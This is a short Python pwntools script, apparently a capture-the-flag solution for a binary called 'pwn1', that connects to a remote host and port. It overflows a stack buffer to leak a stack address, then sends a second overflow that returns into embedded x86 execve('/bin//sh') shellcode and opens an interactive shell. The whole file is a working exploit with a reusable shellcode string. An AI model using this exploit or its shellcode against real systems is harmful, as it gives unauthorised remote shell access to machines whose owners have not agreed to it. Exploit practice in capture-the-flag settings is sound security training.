from pwn import *

context.log_level = 'debug'

#p = process('./pwn1')
p = remote('20.41.78.41', 8881)
e = ELF('./pwn1')
l = e.libc
#l = ELF('./')

pause()


payload = 'a' * 0x14 + p32(0x08048087)

p.recv()
p.send(payload)
stack = u32(p.recv(4))
log.info('stack : ' + hex(stack))

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

payload = 'a' * 0x14 + p32(stack+0x14)
payload += shellcode

p.send(payload)

p.interactive()
